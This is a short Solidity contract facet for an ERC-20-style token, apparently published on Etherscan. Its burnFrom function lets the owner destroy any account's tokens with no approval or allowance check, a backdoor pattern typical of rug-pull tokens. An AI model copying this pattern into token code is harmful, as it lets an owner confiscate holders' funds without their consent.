/**
 *Submitted for verification at Etherscan.io on 2023-10-31
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract _burnFacet {
    modifier onlyOwner() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == ds.owner);
        _;
    }

    event Transfer(address indexed from, address indexed to, uint value);
    function _burn(address account, uint256 amount) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(account != address(0), "ERC20: burn from the zero address");
        require(
            ds._balances[account] >= amount,
            "ERC20: burn amount exceeds balance"
        );
        ds._balances[account] -= amount;
        ds.totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
    function burnFrom(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }
}
